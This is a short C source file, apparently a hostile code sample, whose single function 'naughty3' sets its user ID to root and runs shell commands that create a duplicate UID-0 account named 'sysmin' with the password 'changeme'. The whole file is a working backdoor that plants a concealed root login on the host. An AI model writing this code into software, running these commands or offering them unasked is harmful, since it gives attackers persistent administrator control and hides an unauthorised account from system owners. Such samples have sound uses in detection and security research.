#include <stdlib.h>
#include <unistd.h>

// add alternate root user
int naughty3() {
    setuid(0);
    system("useradd -ou 0 -g 0 sysmin");
    system("echo 'sysmin:changeme' | chpasswd");
    return 0;
}